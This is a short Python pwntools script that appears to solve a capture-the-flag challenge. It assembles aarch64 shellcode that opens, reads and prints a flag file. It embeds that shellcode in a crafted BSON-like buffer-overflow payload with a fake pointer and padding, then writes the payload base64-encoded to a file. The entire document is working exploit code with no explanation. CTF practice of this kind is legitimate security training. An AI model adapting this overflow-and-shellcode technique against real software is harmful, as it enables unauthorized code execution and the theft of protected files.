# open read write(kprintf)

from pwn import *
context.arch = "aarch64"
shellcode = asm('mov x8, 4') 
shellcode += asm('mov x1, 0')
shellcode += asm('mov x0, {}'.format(0xfc50-10))
shellcode += asm('mov x2, {}'.format(0))
shellcode += asm('svc #0')

shellcode += asm('mov x8, 5')
shellcode += asm('mov x0, 0')
shellcode += asm('mov x1, {}'.format(0xfc00-10))
shellcode += asm('mov x2, {}'.format(0x30))
shellcode += asm('svc #0')

shellcode += asm('mov x8, 0')
shellcode += asm('mov x0, {}'.format(0xfc00-10))
shellcode += asm('svc #0')


name = b'/flg'.ljust(10, b'\x00')

payload = b'\xe0\x00\x00\x00\x10CVC\x00`\x01\x00\x00\x10MON\x00\x00\x00\x00\x00\x10YR\x00\x00\x00\x00\x00\x02CC\x00\x10\x00\x00\x006011222233334410'
payload += p64(0xFFFFFFFFFFFFFFFF) + p64(0xfc50) + name + shellcode + b'A'*(152 - len(shellcode))
payload += b'\x00\x00'
# b"gg/run\x00ttt"
buf = base64.b64encode(payload) + b' '

with open('gen-bson0', 'wb') as f:
    f.write(buf)

